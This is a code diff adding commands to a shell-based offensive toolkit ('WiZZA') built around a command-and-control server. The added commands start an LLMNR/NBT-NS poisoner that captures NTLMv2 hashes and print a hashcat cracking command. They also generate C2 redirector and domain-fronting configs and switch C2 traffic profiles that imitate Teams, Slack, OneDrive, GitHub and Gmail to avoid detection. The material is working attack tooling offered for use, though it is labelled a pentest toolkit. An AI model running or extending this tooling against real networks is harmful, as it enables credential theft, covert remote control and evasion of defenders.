@@ -6424,6 +6424,227 @@ except: print('  (error reading ledger)')
     esac
 }
 
+# ══════════════════════════════════════════════════════════════════════════════
+# LLMNR / NBT-NS poisoner
+# ══════════════════════════════════════════════════════════════════════════════
+cmd_llmnr() {
+    SUB="${1:-start}"; ATTACKER_IP="${2:-}"
+    C2URL="http://localhost:${C2_PORT:-8888}"
+
+    case "$SUB" in
+        start)
+            ok "Starting LLMNR/NBT-NS poisoner..."
+            echo -e "  ${Y}Requires root (ports 5355, 137, 445)${N}"
+            if [ -z "$ATTACKER_IP" ]; then
+                ATTACKER_IP=$(ip route get 8.8.8.8 2>/dev/null | awk '/src/{for(i=1;i<=NF;i++) if($i=="src"){print $(i+1);exit}}')
+            fi
+            echo -e "  Attacker IP: ${C}$ATTACKER_IP${N}"
+            # Start via C2 API if server running
+            RES=$(curl -sf "$C2URL/llmnr/start?ip=$ATTACKER_IP" 2>/dev/null)
+            if [ -n "$RES" ]; then
+                echo "$RES"
+            else
+                # Start standalone
+                step "1" "Launching standalone LLMNR poisoner..."
+                python3 -c "
+import sys; sys.path.insert(0,'$(dirname "$0")/op/modules')
+from llmnr_poison import start, get_hashes
+import time
+print(start('$ATTACKER_IP'))
+print('Listening... Ctrl+C to stop and show hashes')
+try:
+    while True: time.sleep(1)
+except KeyboardInterrupt:
+    pass
+print(get_hashes())
+"
+            fi
+            ;;
+        stop)
+            ok "Stopping LLMNR poisoner..."
+            curl -sf "$C2URL/llmnr/stop" | python3 -m json.tool 2>/dev/null || echo "(no response — server may not be running)"
+            ;;
+        hashes)
+            ok "Captured NTLM hashes:"
+            curl -sf "$C2URL/llmnr/hashes" 2>/dev/null || \
+            python3 -c "
+import sys; sys.path.insert(0,'$(dirname "$0")/op/modules')
+from llmnr_poison import get_hashes; print(get_hashes())
+"
+            ;;
+        *)
+            echo -e "${W}Usage:${N} start llmnr [start|stop|hashes] [<attacker_ip>]"
+            echo -e "  ${C}start llmnr start${N}           — start LLMNR/NBT-NS poisoner (needs root)"
+            echo -e "  ${C}start llmnr start 10.0.0.1${N}  — specify attacker IP to spoof"
+            echo -e "  ${C}start llmnr stop${N}            — stop poisoner"
+            echo -e "  ${C}start llmnr hashes${N}          — show captured NTLMv2 hashes"
+            echo -e ""
+            echo -e "  Crack: ${C}hashcat -m 5600 hashes.txt rockyou.txt${N}"
+            ;;
+    esac
+}
+
+# ══════════════════════════════════════════════════════════════════════════════
+# Report generator
+# ══════════════════════════════════════════════════════════════════════════════
+cmd_report() {
+    FMT="${1:-html}"; OUT="${2:-}"
+    C2URL="http://localhost:${C2_PORT:-8888}"
+    TIMESTAMP=$(date +%Y%m%d_%H%M%S)
+
+    case "$FMT" in
+        html|json|csv)
+            ok "Generating $FMT report..."
+            URL="$C2URL/report?fmt=$FMT"
+            if [ -n "$OUT" ]; then
+                curl -sf "$URL" -o "$OUT" && ok "Saved: $OUT" || err "Report generation failed — is C2 running?"
+            else
+                OUT="$HOME/.wizza/report_$TIMESTAMP.$FMT"
+                curl -sf "$URL" -o "$OUT" && ok "Saved: $OUT" || {
+                    # Fallback: generate offline
+                    python3 - <<'PYEOF'
+import sys, json, os
+sys.path.insert(0, os.path.join(os.path.dirname(sys.argv[0]), 'op', 'modules'))
+from report_gen import generate_report
+# Stub agents for offline demo
+out = generate_report({}, {}, title="WiZZA Pentest Report [offline]")
+path = os.path.expanduser("~/.wizza/report_offline.html")
+os.makedirs(os.path.dirname(path), exist_ok=True)
+open(path,"w").write(out)
+print(f"Report saved: {path}")
+PYEOF
+                }
+            fi
+            echo -e "  View: ${C}open $OUT${N}  (or xdg-open / browse to /report on C2)"
+            ;;
+        *)
+            echo -e "${W}Usage:${N} start report [html|json|csv] [output_file]"
+            echo -e "  ${C}start report${N}           — generate HTML pentest report"
+            echo -e "  ${C}start report html${N}      — HTML report (default)"
+            echo -e "  ${C}start report json${N}      — JSON export"
+            echo -e "  ${C}start report csv${N}       — CSV spreadsheet"
+            echo -e ""
+            echo -e "  Also available in C2 panel sidebar → Report"
+            echo -e "  Direct URL: ${C}http://localhost:8888/report${N}"
+            ;;
+    esac
+}
+
+# ══════════════════════════════════════════════════════════════════════════════
+# Redirector config generator
+# ══════════════════════════════════════════════════════════════════════════════
+cmd_redirector() {
+    TYPE="${1:-apache}"; C2HOST="${2:-127.0.0.1}"; C2PORT="${3:-8888}"
+    OUTDIR="$HOME/.wizza/redirector"
+    mkdir -p "$OUTDIR"
+
+    ok "Generating $TYPE redirector config (C2: $C2HOST:$C2PORT)"
+
+    python3 - "$TYPE" "$C2HOST" "$C2PORT" "$OUTDIR" <<'PYEOF'
+import sys, os
+sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), 'op', 'modules'))
+# Resolve path from arg0 context
+script_dir = os.path.dirname(os.path.abspath(sys.argv[0])) if len(sys.argv) > 0 else "."
+sys.path.insert(0, os.path.join(script_dir, 'op', 'modules'))
+from redirector import apache_redirector, nginx_redirector, caddy_redirector, socat_forward, domain_front_config, setup_guide
+
+rtype   = sys.argv[1] if len(sys.argv) > 1 else "apache"
+c2host  = sys.argv[2] if len(sys.argv) > 2 else "127.0.0.1"
+c2port  = int(sys.argv[3]) if len(sys.argv) > 3 else 8888
+outdir  = sys.argv[4] if len(sys.argv) > 4 else "/tmp"
+
+configs = {
+    "apache":      (apache_redirector(c2host, c2port),          "apache.conf"),
+    "nginx":       (nginx_redirector(c2host, c2port),           "nginx.conf"),
+    "caddy":       (caddy_redirector(c2host, c2port),           "Caddyfile"),
+    "socat":       (socat_forward(c2host, c2port),              "socat.sh"),
+    "domain-front":(domain_front_config("cdn.example.com", c2host), "domain_front.txt"),
+    "all":         None,
+}
+
+if rtype == "all":
+    for name, (cfg, fname) in {k:v for k,v in configs.items() if v}.items():
+        path = os.path.join(outdir, fname)
+        open(path, "w").write(cfg)
+        print(f"  Saved: {path}")
+    guide = setup_guide(c2host, "your-redirector.example.com")
+    path = os.path.join(outdir, "SETUP.txt")
+    open(path, "w").write(guide)
+    print(f"  Saved: {path}")
+elif rtype in configs and configs[rtype]:
+    cfg, fname = configs[rtype]
+    path = os.path.join(outdir, fname)
+    open(path, "w").write(cfg)
+    print(f"\n{cfg}\n")
+    print(f"  Saved: {path}")
+else:
+    print(f"Unknown type: {rtype}. Options: apache nginx caddy socat domain-front all")
+PYEOF
+
+    echo ""
+    echo -e "  ${C}start redirector apache${N}       — Apache mod_rewrite + proxy config"
+    echo -e "  ${C}start redirector nginx${N}        — Nginx location-based routing"
+    echo -e "  ${C}start redirector caddy${N}        — Caddyfile (auto TLS)"
+    echo -e "  ${C}start redirector socat${N}        — Quick socat port forward"
+    echo -e "  ${C}start redirector domain-front${N} — Domain fronting guide"
+    echo -e "  ${C}start redirector all${N}          — Generate all + setup guide"
+    echo -e "  Configs saved to: ${Y}$OUTDIR/${N}"
+}
+
+# ══════════════════════════════════════════════════════════════════════════════
+# C2 Profile switcher
+# ══════════════════════════════════════════════════════════════════════════════
+cmd_profile() {
+    PROFILE="${1:-}"
+    C2URL="http://localhost:${C2_PORT:-8888}"
+
+    if [ -z "$PROFILE" ]; then
+        ok "Available C2 profiles:"
+        echo -e "  ${C}cdn${N}      — Generic Cloudflare CDN traffic (default)"
+        echo -e "  ${C}teams${N}    — Microsoft Teams API mimicry"
+        echo -e "  ${C}slack${N}    — Slack conversations.history"
+        echo -e "  ${C}onedrive${N} — OneDrive SkyDriveSync"
+        echo -e "  ${C}github${N}   — GitHub API (git/2.43.0 user-agent)"
+        echo -e "  ${C}gmail${N}    — Gmail attachment URLs"
+        echo -e ""
+        echo -e "  Usage: ${C}start profile <name>${N}"
+        RES=$(curl -sf "$C2URL/profiles" 2>/dev/null)
+        [ -n "$RES" ] && echo "  Server: $RES"
+        return
+    fi
+
+    ok "Setting C2 profile: $PROFILE"
+    RES=$(curl -sf "$C2URL/profiles/set/$PROFILE" 2>/dev/null)
+    if [ -n "$RES" ]; then
+        echo "$RES"
+    else
+        echo -e "  ${Y}C2 server not running — profile will apply at next start${N}"
+        echo "export C2_PROFILE=$PROFILE" >> "$HOME/.wizza/wizza.env" 2>/dev/null || true
+        ok "Saved C2_PROFILE=$PROFILE to ~/.wizza/wizza.env"
+    fi
+}
+
+# ══════════════════════════════════════════════════════════════════════════════
+# Network map
+# ══════════════════════════════════════════════════════════════════════════════
+cmd_netmap() {
+    C2URL="http://localhost:${C2_PORT:-8888}"
+    ok "Network Map"
+    echo -e "  URL: ${C}$C2URL/netmap${N}"
+    echo -e "  Data: ${C}$C2URL/agents/json${N}"
+    echo -e ""
+    echo -e "  Open in browser:"
+    if command -v xdg-open &>/dev/null; then
+        xdg-open "$C2URL/netmap" &>/dev/null &
+        ok "Opened in browser"
+    elif command -v open &>/dev/null; then
+        open "$C2URL/netmap" &>/dev/null &
+        ok "Opened in browser"
+    else
+        echo -e "  ${Y}Browse to: $C2URL/netmap${N}"
+    fi
+}
+
 # ── Entry point — dispatch command or run wizard ─────────────
 CMD="${1:-}"
 # Auto-install shortcuts if not already on PATH (first run on new machine)
@@ -6460,6 +6681,11 @@ case "$CMD" in
     poly)           init_files; cmd_poly   "$2" ;;
     evade)          init_files; cmd_evade  "$2" ;;
     exploit)        init_files; cmd_exploit "$2" ;;
+    llmnr)          init_files; cmd_llmnr "$2" "$3" ;;
+    report)         init_files; cmd_report "$2" "$3" ;;
+    redirector)     init_files; cmd_redirector "$2" "$3" "$4" ;;
+    profile)        init_files; cmd_profile "$2" ;;
+    netmap)         init_files; cmd_netmap ;;
     physical)
         # sudo re-exec entry point: start physical <victim_ip> <target_domain>
         VICTIM_IP="$2"; TARGET_DOMAIN="$3"
